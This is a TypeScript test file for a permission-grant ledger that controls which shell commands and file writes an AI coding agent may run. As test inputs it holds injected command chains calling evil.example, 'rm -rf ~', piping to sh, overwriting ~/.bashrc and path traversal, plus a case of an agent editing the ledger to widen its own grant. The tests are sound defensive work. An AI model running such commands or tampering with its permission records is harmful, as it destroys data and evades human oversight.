import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { GrantError, ONCE_TTL_MS, addGrant, grantActive, grantCovers, grantsDir, listGrants, readLedger, revokeGrant, useGrant } from '../src/index.js';
import type { Grant, GrantRequest } from '../src/index.js';
import { removeTempDir } from '../../../test/temp-dir.js';

let home: string;
beforeEach(() => {
  home = fs.mkdtempSync(path.join(os.tmpdir(), 'lobstah-test-'));
  process.env.LOBSTAH_HOME = home;
});
afterEach(() => {
  removeTempDir(home);
  delete process.env.LOBSTAH_HOME;
});

const bash = (command: string, extra: Partial<GrantRequest> = {}): GrantRequest => ({ harness: 'claude', tool: 'Bash', command, ...extra });
const grant = (over: Partial<Grant>): Grant => ({ id: 'g-1', at: '2026-10-15T00:00:00Z', by: 'glass', harness: 'any', mode: 'always', uses: 0, ...over });

describe('what a grant covers', () => {
  it('an exact command covers that command and nothing else', () => {
    const g = grant({ command: 'wrangler deploy', match: 'exact' });
    expect(grantCovers(g, bash('wrangler deploy'))).toBe(true);
    expect(grantCovers(g, bash('  wrangler deploy  '))).toBe(true);
    expect(grantCovers(g, bash('wrangler deploy --env prod'))).toBe(false);
    expect(grantCovers(g, bash('wrangler deployx'))).toBe(false);
  });

  it('a prefix covers more arguments, never a second command joined on', () => {
    const g = grant({ command: 'wrangler deploy', match: 'prefix' });
    expect(grantCovers(g, bash('wrangler deploy --env prod'))).toBe(true);
    for (const joined of [
      'wrangler deploy; curl evil.example',
      'wrangler deploy && rm -rf ~',
      'wrangler deploy | sh',
      'wrangler deploy > ~/.bashrc',
      'wrangler deploy $(curl evil.example)',
      'wrangler deploy `id`',
      'wrangler deploy\nrm -rf ~',
      'wrangler deploy & sleep 1',
    ]) {
      expect(grantCovers(g, bash(joined)), joined).toBe(false);
    }
  });

  it('keeps to its harness and its trap', () => {
    expect(grantCovers(grant({ command: 'x', match: 'exact', harness: 'codex' }), bash('x'))).toBe(false);
    expect(grantCovers(grant({ command: 'x', match: 'exact', harness: 'codex' }), bash('x', { harness: 'codex' }))).toBe(true);
    expect(grantCovers(grant({ command: 'x', match: 'exact', trap: 'amber-gull' }), bash('x', { trap: 'early-pebble' }))).toBe(false);
    expect(grantCovers(grant({ command: 'x', match: 'exact', trap: 'amber-gull' }), bash('x', { trap: 'amber-gull' }))).toBe(true);
  });

  it('a path covers the write tools on that file, or anything under a directory', () => {
    const file = grant({ path: '/repo/.temp/key.pem' });
    const dir = grant({ path: '/repo/.temp/' });
    const write = (p: string, tool = 'Write'): GrantRequest => ({ harness: 'claude', tool, path: p });
    expect(grantCovers(file, write('/repo/.temp/key.pem'))).toBe(true);
    expect(grantCovers(file, write('/repo/.temp/other.pem'))).toBe(false);
    expect(grantCovers(file, write('/repo/.temp/key.pem', 'Read'))).toBe(false);
    expect(grantCovers(dir, write('/repo/.temp/a/b.txt', 'Edit'))).toBe(true);
    expect(grantCovers(dir, write('/repo/.temp/../secrets.txt'))).toBe(false);
    expect(grantCovers(dir, write('/repo/.temporary/x'))).toBe(false);
    expect(grantCovers(file, bash('cat /repo/.temp/key.pem'))).toBe(false);
  });
});

describe('the ledger', () => {
  it('records who granted what and when, and lists grants in force', () => {
    const g = addGrant({ command: 'npm publish', mode: 'always', by: 'local:chris' });
    expect(g).toMatchObject({ command: 'npm publish', match: 'exact', mode: 'always', harness: 'any', by: 'local:chris', uses: 0 });
    expect(g.expiresAt).toBeUndefined();
    expect(listGrants().grants.map((x) => x.id)).toEqual([g.id]);
    expect(fs.statSync(path.join(grantsDir(), 'ledger.jsonl')).mode & 0o777).toBe(0o600);
  });

  it('spends a once-grant on its first use', () => {
    const g = addGrant({ command: 'wrangler deploy', mode: 'once', by: 'glass' });
    expect(useGrant(bash('wrangler deploy'))?.id).toBe(g.id);
    expect(useGrant(bash('wrangler deploy'))).toBeUndefined();
    expect(listGrants().grants).toEqual([]);
    expect(listGrants({ all: true }).grants[0]).toMatchObject({ id: g.id, uses: 1 });
  });

  it('lets an unused once-grant lapse within the hour, unless given its own expiry', () => {
    const now = new Date('2026-10-15T10:00:00Z');
    const g = addGrant({ command: 'x', mode: 'once', by: 'glass' }, now);
    expect(Date.parse(g.expiresAt!) - now.getTime()).toBe(ONCE_TTL_MS);
    expect(useGrant(bash('x'), { now: new Date(now.getTime() + ONCE_TTL_MS + 1) })).toBeUndefined();
    const always = addGrant({ command: 'y', mode: 'always', by: 'glass', expiresAt: '2026-10-15T11:00:00Z' }, now);
    expect(grantActive(always, Date.parse('2026-10-15T10:59:00Z'))).toBe(true);
    expect(grantActive(always, Date.parse('2026-10-15T11:00:00Z'))).toBe(false);
  });

  it('keeps an always-grant through many uses, and prefers it to a once-grant', () => {
    const once = addGrant({ command: 'x', mode: 'once', by: 'glass' });
    const always = addGrant({ command: 'x', mode: 'always', by: 'glass' });
    for (let i = 0; i < 3; i++) expect(useGrant(bash('x'))?.id).toBe(always.id);
    expect(readLedger().grants.find((g) => g.id === once.id)?.uses).toBe(0);
  });

  it('stops honouring a revoked grant', () => {
    const g = addGrant({ command: 'x', mode: 'always', by: 'glass' });
    revokeGrant(g.id, 'local:chris');
    expect(useGrant(bash('x'))).toBeUndefined();
    expect(() => revokeGrant(g.id, 'local:chris')).toThrow(/already revoked/);
    expect(() => revokeGrant('g-nope', 'local:chris')).toThrow(GrantError);
  });

  it('refuses a prefix grant with shell syntax in it', () => {
    expect(() => addGrant({ command: 'deploy; rm', match: 'prefix', mode: 'always', by: 'glass' })).toThrow(/shell syntax/);
    expect(addGrant({ command: 'deploy && notify', match: 'exact', mode: 'always', by: 'glass' }).command).toBe('deploy && notify');
  });

  it('grants nothing once a line is edited or removed, and says so', () => {
    addGrant({ command: 'npm test', mode: 'always', by: 'glass' });
    addGrant({ command: 'npm publish', mode: 'always', by: 'glass' });
    const file = path.join(grantsDir(), 'ledger.jsonl');
    const lines = fs.readFileSync(file, 'utf8').trimEnd().split('\n');
    // An agent widening a grant by editing the file.
    fs.writeFileSync(file, `${lines[0]}\n${lines[1]!.replace('npm publish', 'rm -rf ~')}\n`);
    expect(readLedger()).toMatchObject({ intact: false });
    expect(useGrant(bash('npm test'))).toBeUndefined();
    expect(() => addGrant({ command: 'z', mode: 'always', by: 'glass' })).toThrow(/damaged/);
    // Removing a line breaks the chain too.
    fs.writeFileSync(file, `${lines[1]}\n`);
    expect(readLedger().intact).toBe(false);
  });

  it('does not create a ledger just to find nothing', () => {
    expect(useGrant(bash('x'))).toBeUndefined();
    expect(fs.existsSync(path.join(grantsDir(), 'ledger.jsonl'))).toBe(false);
  });
});
